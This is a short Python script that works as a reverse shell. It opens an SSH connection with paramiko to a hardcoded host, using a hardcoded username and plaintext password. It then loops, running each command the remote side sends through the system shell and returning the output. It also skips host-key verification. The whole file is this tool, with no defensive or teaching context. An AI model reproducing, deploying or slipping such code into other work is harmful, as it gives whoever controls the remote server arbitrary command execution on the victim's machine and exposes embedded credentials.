import paramiko
import subprocess


def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    # client.load_host_keys('/home/chris/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(
                    command,
                    stderr=subprocess.STDOUT,
                    shell=True,
                    timeout=10)
                ssh_session.send(cmd_output)
            except Exception as sc:
                print('Error: {}'.format(sc))
                ssh_session.send(str(sc))
        client.close()
    return


ssh_command('10.1.22.107', 'chris', 'Xn12&z16*vaDhcEdsU', 'ClientConnected')
